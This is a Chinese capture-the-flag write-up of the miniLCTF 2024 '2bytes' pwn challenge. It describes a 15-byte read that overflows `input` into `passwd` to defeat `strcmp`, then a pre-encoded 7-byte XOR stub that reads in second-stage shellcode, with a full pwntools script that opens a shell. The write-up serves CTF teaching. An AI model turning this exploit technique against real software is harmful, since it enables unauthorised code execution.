# miniLCTF 2024 2bytes Writeup

## 题目简述

全局区中 `input[8]` 紧邻随机生成的 `passwd[7]`，程序却向 `input` 读取 15 字节。因此输入可以同时覆盖 `input` 和 `passwd`，让 `strcmp(input, passwd)` 通过。通过检查后，程序只复制 `passwd` 的 7 字节到 RWX 页，对前 7 字节做一次链式异或变换，并从偏移 5 开始执行。需要在 7 字节内搭出第二阶段读取器。

## 解题过程

### 同时控制比较双方

发送布局为：

```text
[8-byte input][7-byte passwd]
```

把同一段编码后的 7 字节分别放入两处，并用一个零字节结束第一个字符串，便可使 `strcmp` 比较相等：

```python
payload = encoded.ljust(8, b"\x00") + encoded
```

### 逆掉自修改并构造 7 字节桩

`pwnme` 对代码执行：

```c
for (ptr = addr; ptr != addr + 5; ptr++)
    ptr[2] ^= ptr[1] ^ ptr[0];
((void (*)())(addr + 5))();
```

希望变换后的真实代码是：

```asm
l:
    xchg rsi, rdx
    syscall
    jmp l
```

入口位于最后两字节，它们是向后跳 7 字节的短跳转；回到开头后，`xchg rsi,rdx` 把 `rsi` 改成 RWX 缓冲区、把 `rdx` 改成 `0x1000`。函数调用前寄存器正好满足 `rax=0`、`rdi=0`，所以随后的 `syscall` 等价于 `read(0, addr, 0x1000)`。

变换是原地从低地址向高地址执行，因此应按同一顺序正向编码：

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./pwn")
io = process(elf.path)

stage0 = asm("""
l:
    xchg rsi, rdx
    syscall
    jmp l
""")
assert len(stage0) == 7

encoded = bytearray(stage0)
for i in range(5):
    encoded[i + 2] = stage0[i + 2] ^ stage0[i + 1] ^ stage0[i]

io.send(bytes(encoded).ljust(8, b"\x00") + bytes(encoded))
io.send(asm(shellcraft.sh()))
io.interactive()
```

第一次 `read` 的第二阶段覆盖 RWX 页开头；循环再次跳回开头后直接执行新写入的 shellcode，获得 shell。

## 方法总结

题目把“只有 7 字节、且从末尾执行”化成了一个两字节向后跳与五字节读入桩。分析极短 shellcode 时，应先记录调用点的寄存器状态，往往无需自行装载所有系统调用参数；同时要严格按程序的原地变换顺序求预编码字节。
